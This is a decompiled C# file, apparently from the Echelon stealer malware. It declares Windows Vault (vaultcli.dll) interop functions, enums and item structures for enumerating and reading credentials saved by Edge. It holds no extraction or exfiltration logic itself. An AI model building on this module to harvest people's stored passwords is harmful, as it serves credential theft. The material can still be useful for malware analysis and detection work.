using System;
using System.Runtime.InteropServices;

namespace Echelon.Stealer.Browsers.Edge
{
	// Token: 0x0200004B RID: 75
	internal class VaultCli
	{
		// Token: 0x060001DF RID: 479
		[DllImport("vaultcli.dll")]
		public static extern int VaultOpenVault(ref Guid vaultGuid, uint offset, ref IntPtr vaultHandle);

		// Token: 0x060001E0 RID: 480
		[DllImport("vaultcli.dll")]
		public static extern int VaultCloseVault(ref IntPtr vaultHandle);

		// Token: 0x060001E1 RID: 481
		[DllImport("vaultcli.dll")]
		public static extern int VaultFree(ref IntPtr vaultHandle);

		// Token: 0x060001E2 RID: 482
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateVaults(int offset, ref int vaultCount, ref IntPtr vaultGuid);

		// Token: 0x060001E3 RID: 483
		[DllImport("vaultcli.dll")]
		public static extern int VaultEnumerateItems(IntPtr vaultHandle, int chunkSize, ref int vaultItemCount, ref IntPtr vaultItem);

		// Token: 0x060001E4 RID: 484
		[DllImport("vaultcli.dll")]
		public static extern int VaultGetItem(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, int arg6, ref IntPtr passwordVaultPtr);

		// Token: 0x060001E5 RID: 485
		[DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
		public static extern int VaultGetItem_1(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);

		// Token: 0x0200004C RID: 76
		public enum VAULT_ELEMENT_TYPE
		{
			// Token: 0x040000DD RID: 221
			Undefined = -1,
			// Token: 0x040000DE RID: 222
			Boolean,
			// Token: 0x040000DF RID: 223
			Short,
			// Token: 0x040000E0 RID: 224
			UnsignedShort,
			// Token: 0x040000E1 RID: 225
			Int,
			// Token: 0x040000E2 RID: 226
			UnsignedInt,
			// Token: 0x040000E3 RID: 227
			Double,
			// Token: 0x040000E4 RID: 228
			Guid,
			// Token: 0x040000E5 RID: 229
			String,
			// Token: 0x040000E6 RID: 230
			ByteArray,
			// Token: 0x040000E7 RID: 231
			TimeStamp,
			// Token: 0x040000E8 RID: 232
			ProtectedArray,
			// Token: 0x040000E9 RID: 233
			Attribute,
			// Token: 0x040000EA RID: 234
			Sid,
			// Token: 0x040000EB RID: 235
			Last
		}

		// Token: 0x0200004D RID: 77
		public enum VAULT_SCHEMA_ELEMENT_ID
		{
			// Token: 0x040000ED RID: 237
			Illegal,
			// Token: 0x040000EE RID: 238
			Resource,
			// Token: 0x040000EF RID: 239
			Identity,
			// Token: 0x040000F0 RID: 240
			Authenticator,
			// Token: 0x040000F1 RID: 241
			Tag,
			// Token: 0x040000F2 RID: 242
			PackageSid,
			// Token: 0x040000F3 RID: 243
			AppStart = 100,
			// Token: 0x040000F4 RID: 244
			AppEnd = 10000
		}

		// Token: 0x0200004E RID: 78
		public struct VAULT_ITEM_WIN8
		{
			// Token: 0x040000F5 RID: 245
			public Guid SchemaId;

			// Token: 0x040000F6 RID: 246
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x040000F7 RID: 247
			public IntPtr pResourceElement;

			// Token: 0x040000F8 RID: 248
			public IntPtr pIdentityElement;

			// Token: 0x040000F9 RID: 249
			public IntPtr pAuthenticatorElement;

			// Token: 0x040000FA RID: 250
			public IntPtr pPackageSid;

			// Token: 0x040000FB RID: 251
			public ulong LastModified;

			// Token: 0x040000FC RID: 252
			public uint dwFlags;

			// Token: 0x040000FD RID: 253
			public uint dwPropertiesCount;

			// Token: 0x040000FE RID: 254
			public IntPtr pPropertyElements;
		}

		// Token: 0x0200004F RID: 79
		public struct VAULT_ITEM_WIN7
		{
			// Token: 0x040000FF RID: 255
			public Guid SchemaId;

			// Token: 0x04000100 RID: 256
			public IntPtr pszCredentialFriendlyName;

			// Token: 0x04000101 RID: 257
			public IntPtr pResourceElement;

			// Token: 0x04000102 RID: 258
			public IntPtr pIdentityElement;

			// Token: 0x04000103 RID: 259
			public IntPtr pAuthenticatorElement;

			// Token: 0x04000104 RID: 260
			public ulong LastModified;

			// Token: 0x04000105 RID: 261
			public uint dwFlags;

			// Token: 0x04000106 RID: 262
			public uint dwPropertiesCount;

			// Token: 0x04000107 RID: 263
			public IntPtr pPropertyElements;
		}

		// Token: 0x02000050 RID: 80
		[StructLayout(LayoutKind.Explicit)]
		public struct VAULT_ITEM_ELEMENT
		{
			// Token: 0x04000108 RID: 264
			[FieldOffset(0)]
			public VaultCli.VAULT_SCHEMA_ELEMENT_ID SchemaElementId;

			// Token: 0x04000109 RID: 265
			[FieldOffset(8)]
			public VaultCli.VAULT_ELEMENT_TYPE Type;
		}
	}
}
